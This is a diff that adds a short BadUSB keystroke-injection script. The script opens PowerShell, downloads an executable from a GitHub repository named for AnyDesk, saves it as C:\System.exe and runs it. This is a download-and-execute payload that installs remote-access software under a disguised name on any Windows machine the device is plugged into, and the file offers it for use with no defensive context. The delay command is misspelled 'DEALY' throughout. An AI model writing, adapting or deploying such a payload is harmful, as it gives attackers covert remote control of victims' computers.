@@ -1,0 +1,8 @@
+GUI r
+DEALY 500
+STRING powershell
+DEALY 1000
+STRING Invoke-WebRequest -Uri 'https://github.com/AnvXprogs/AnyDeskBadUSB/raw/refs/heads/main/AnyDesk%20(2).exe' -OutFile 'C:\\System.exe'
+DEALY 3000
+STRING ./System.exe
+
